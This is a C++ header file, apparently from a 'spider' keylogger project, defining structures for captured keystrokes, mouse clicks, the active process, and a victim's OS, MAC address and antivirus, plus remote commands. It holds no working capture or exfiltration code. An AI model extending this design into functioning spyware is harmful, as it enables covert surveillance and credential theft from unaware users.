//
// Created by delacr_a on 28/09/17.
//

#ifndef CPP_SPIDER_DATASTRUCTURE_H
#define CPP_SPIDER_DATASTRUCTURE_H

# include <string>

/// \enum KEYTYPE
enum class	KEYTYPE
{
    KNONE = 0,
    RC,
    LC,
    SCROLLUP,
    SCROLLDOWN,
    MC
};

/// \struct t_message
struct		        t_message
{
    std::string 	timestamp; //!< The timestamp at which the info was collected.
    std::string		process; //!< The process on which the info was collected.
    std::string		data; //!< The info that was collected (letters).
    std::string		type; //!< The type of the structure (KEYSTROKE).
};

/// \struct t_mouse
struct			t_mouse
{
    std::string		timestamp; //!< The timestamp at which the info was collected.
    std::string		process; //!< The process on which the info was collected.
    KEYTYPE		keytype; //!<  Type of click.
    unsigned int	x; //!< The x position of the mouse when the info was collected.
    unsigned int	y; //!< The y position of the mouse when the info was collected.
    std::string		type; //!<  The type of the structure (MOUSE).
};

/// \struct t_register
struct			t_register
{
    std::string		os; //!< The OS the user is running.
    std::string		mac; //!< The MAC address of the user.
    std::string		antivirus; //!< The antivirus used by the user.
};

/// \struct t_command
struct			t_command
{
    std::string		type; //!< The name of the command.
    std::string		data; //!< Data that may be used by the command.
};

/// \struct t_unserialized
struct		t_unserialized
{
    t_message	*message; //!< The message infos collected after unserializing data of a ptree.
    t_register	*register_; //!< The register infos collected after unserializing data of a ptree.
    t_mouse	*mouse; //!< The mouse infos collected after unserializing data of a ptree.
    t_command	*command; //!< The command infos collected after unserializing data of a ptree.
};

#endif //CPP_SPIDER_DATASTRUCTURE_H
